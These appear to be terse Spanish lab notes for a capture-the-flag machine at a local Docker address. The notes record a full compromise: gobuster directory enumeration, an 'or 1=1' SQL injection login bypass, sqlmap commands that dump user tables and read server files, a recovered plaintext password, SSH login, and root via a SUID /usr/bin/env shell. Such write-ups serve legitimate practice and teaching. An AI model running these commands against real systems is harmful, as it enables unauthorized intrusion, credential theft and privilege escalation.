172.17.0.2 Apuntes


gobuster dir -u http://172.17.0.2/ -w /usr/share/rockyou.txt -x php -t 100 -k -r --exclude-length 275,11622 --no-error

http://172.17.0.2/bills/

/index.php            (Status: 200) [Size: 11622]
/intranet             (Status: 200) [Size: 1889]
/bills                (Status: 200) [Size: 4676]


or 1=1 entre a http://172.17.0.2/bills/panel.php
Soy mario

sqlmap -u http://172.17.0.2/bills/panel.php --batch  --dbs --forms

sqlmap -u http://172.17.0.2/bills/panel.php --batch -D register -T users -C passwd,username --dump --forms


sqlmap -u http://172.17.0.2/bills/index.php --batch --is-dba --forms
Nos dice que el usuario de bbdd tiene privilegios de tipo Dba asique podremos interactuar con lso archivos

sqlmap 'http://172.17.0.2/bills/index.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Content-Length: 39' -H 'Origin: http://172.17.0.2' -H 'Connection: keep-alive' -H 'Referer: http://172.17.0.2/bills/index.php' -H 'Cookie: PHPSESSID=pb7hh6olehpjkco20q10s1qjuf' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' --data-raw 'username=admin&password=admin' --batch --file-read "/var/www/html/bills/panel.php"

  <div class="value">duque</div>
                    </div>
                    <div class="field">
                        <label>Password</label>
                    <div class="value">duquelaje81029557!<


Entramos por ssh
Nada en grupos id
no peude hacer sudo -l
nada en su carpeta

find / -perm -4000 2>/dev/null

ls -l /usr/bin/env
-rwsr-xr-x 1 root root 43976 Jan 23  2026 /usr/bin/env


env /bin/sh -p
# whoami
root


